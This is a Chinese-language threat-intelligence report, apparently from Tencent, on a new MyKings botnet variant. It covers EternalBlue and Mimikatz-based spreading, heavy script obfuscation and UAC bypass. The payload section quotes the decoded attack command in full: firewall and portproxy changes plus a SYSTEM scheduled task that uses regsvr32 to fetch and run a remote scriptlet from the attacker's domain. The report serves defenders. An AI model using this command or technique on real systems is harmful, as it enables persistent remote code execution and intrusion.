# MyKings僵尸网络最新变种突袭，攻击代码多次加密混淆，难以检测

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzI5ODk3OTM1Ng==&mid=2247486115&idx=1&sn=c14cffc3fbad55b0273b0a74a196d03c&chksm=ec9cd3d0dbeb5ac615732804b322ae98d2f70c8f470981176e88f39dcedfe683899b92f50506&scene=126&sessionid=1681278607#rd](http://mp.weixin.qq.com/s?__biz=MzI5ODk3OTM1Ng==&mid=2247486115&idx=1&sn=c14cffc3fbad55b0273b0a74a196d03c&chksm=ec9cd3d0dbeb5ac615732804b322ae98d2f70c8f470981176e88f39dcedfe683899b92f50506&scene=126&sessionid=1681278607#rd)

![](../Images/88b9667c92778179ad318ceaf355b836.png)**0x1 概述**  
近日，腾讯御见威胁情报检测到了Mykings僵尸网络迎来了一波更新，通过更新后的样本免杀度极高，且加密手段复杂**，**采用较高超的攻击技巧，提升了安全检测的难度。

  

MyKings僵尸网络2017 年 2月左右开始出现，该僵尸网络通过扫描互联网上 1433 及其他多个端口渗透进入受害者主机，然后传播包括 DDoS、Proxy（代理服务）、RAT（远程控制木马）、Miner（挖矿木马）在内的多种不同用途的恶意代码。腾讯御见威胁情报中心曾在今年五月发现Mykings利用Nsis脚本进行SMB爆破传播挖矿。由于MyKings僵尸网络主动扩散的能力较强，影响范围较广，对企业用户危害严重。

  

**Myking僵尸网络最新变种的技术特点：**  
1.攻击指令入侵成功，即通过Powershell下载king.ps1脚本；  
2.king.ps1经过多次混淆加密，具有自我更新和横向移动扩散能力；  
3.Mykings僵尸网络横向扩散利用了永恒之蓝漏洞和Mimikatz攻击神器；  
4.Mykings僵尸网络多次使用加密混淆脚本，以掩盖攻击意图，逃避安全软件检测；  
5.攻击者利用肉鸡电脑开启代理服务，肉鸡电脑可能成为攻击其他系统的跳板；  
6.攻击脚本中有绕过Windows UAC的行为，避免危险操作被操作系统的安全功能拦截；  
7.御见威胁情报中心监控发现，本轮攻击开始于9月4日，放量测试后攻击者很快关闭C2服务器；  

  

**0x2 威胁等级（高危）**  
**危害评估：★★★★☆**  
Mykings僵尸网络由蠕虫病毒主动攻击、主动扩散，被入侵的系统曾被用于DDoS攻击、提供Proxy（代理服务）、RAT（安装远程控制木马）、Miner（安装挖矿木马）。  
  
**影响评估：★★★★☆**  
对未修补漏洞的企业网络信息安全有严重威胁，企业网络被入侵，可能成为攻击其他网络的跳板，或成为新的攻击源。   
  
**技术评估：★★★★☆**  
Powershell脚本经过多次混淆加密，绕过UAC，利用Mimikatz攻击工具在内网传播，攻击者有较高的攻击技巧。

**0x3 影响面**  
对未修补永恒之蓝安全漏洞的企业内网威胁极大

**2、横向移动分析：**  
该样本使用两种攻击方法进行横向感染：永恒之蓝，和利用NTLM hash 进行Smbclient。  

**永恒之蓝：**  
扫描内网开放445端口IP，并且该IP没有开放65353端口，随后会利用内置永恒之蓝利用代码eb7和eb8函数进行攻击。

*   eb7：是针对windows 7/2008 R2
    
*   eb8：是针对windows 8/8.1/2012 R2
    

![](../Images/90ca149723d34e5121ed420b6354f561.png)

漏洞攻击代码来自exploit-db.网站修改版。攻击成功后，会执行base64解密后的payload。  

**SMBClient：**  
首先调用GetUserInfo函数，该函数内容同样经过编码加密，对其解密后发现会调用内置已加密的exe。该Exe为**修改版的Mimikatz，****用于获取本地帐号和Ntml hash**。  

![](../Images/259a43574433edfba57baa41eca406ab.png)

![](../Images/d27a561f3c9f193bb1c87ff94b40b095.png)

Mimikatz会将获取到的帐号和Ntlm存储在%temp%\\tmp.log文件中：  

![](../Images/22ea32bdcc5e6b650daa3e37087d7d65.png)

将获取到的账号和NTLM Hash和内置的部分帐号和NTLM值(脚本中硬编码)组成字典，然后利用SMBClient进行上传脚本。

**3、payload分析**  
payload部分依然被严重加密：  

![](../Images/81647225d478d5fe1104b0900bcbf324.png)

解密后，得到执行payload的命令如下：

> cmd.exe /c netsh.exe firewall add portopening tcp 65353 DNS&cmd.exe /c netsh interface portproxy add v4tov4 listenport=65353 connectaddress=8.8.8.8 connectport=53 & cmd.exe /c netsh advfirewall firewall add rule name=DNS dir=in action=allow protocol=TCP localport=65353 & cmd.exe /c schtasks /create /ru system /sc MINUTE /mo 40 /st 07:00:00 /tn DnsCore /tr "regsvr32 /u /s /i:http://pages.ooguy.com/dns.sct scrobj.dll"

  
Payload会向防火墙添加65353端口，开启代理，设置当IP访问65353端口时，本机就连接到8.8.8.8的53端口上，并且设置任务计划定时访问下载http://pages.ooguy.com/dns.sct。目前该下载链接失效。

  

猜测这里跳转到8.8.8.8的53端口其真实意图尚不明确，可能用于调试目的，或可能变更为代理服务、下载服务、或将肉鸡电脑作为攻击跳板，发起DDoS攻击等等。

**0x5 趋势&总结**  
本次Mykings僵尸网络更新，采用了极其复杂的加密和混淆技术，大大增加了免杀的能力。 其中一个脚本就加密多达4、5次。而且此次捕获的样本并无其他可执行二进制落地，其利用的部分二进制恶意工具均被加密硬编码在脚本中，执行时直接注入相关进程，提升了安全软件的检测难度。

  

从C&C域名监测来看，该波更新开始于9月4日，仅放量了一部分用户。目前已经关闭了该C&C服务器。因此我们判断，作者可能在进行一些测试，用于进行下一波更猛料的攻击。  

![](../Images/db27f7180f2974a8498ad8a62057be0e.png)
